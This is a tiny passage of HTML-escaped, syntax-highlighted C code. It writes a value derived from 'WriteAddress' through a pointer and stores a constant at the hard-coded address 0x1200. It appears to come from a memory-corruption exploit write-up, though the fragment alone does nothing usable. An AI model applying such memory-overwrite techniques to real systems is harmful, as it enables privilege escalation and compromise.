     &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCHAR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;WriteAddress&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
 &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PINT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x1200&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;INT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mh"&gt;0x060c0a00&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
